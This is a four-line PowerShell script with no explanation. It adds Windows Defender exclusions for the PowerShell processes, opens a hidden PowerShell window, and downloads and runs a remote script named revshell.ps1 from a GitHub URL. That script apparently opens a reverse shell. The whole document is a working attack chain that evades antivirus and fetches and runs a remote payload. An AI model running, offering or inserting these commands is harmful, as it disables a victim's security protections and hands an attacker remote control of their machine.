Add-MpPreference -ExclusionProcess "powershell.exe"
Add-MpPreference -ExclusionProcess "pwsh.exe"
powershell -windowstyle hidden
IEX(IWR https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/revshell.ps1 -UseBasicParsing)
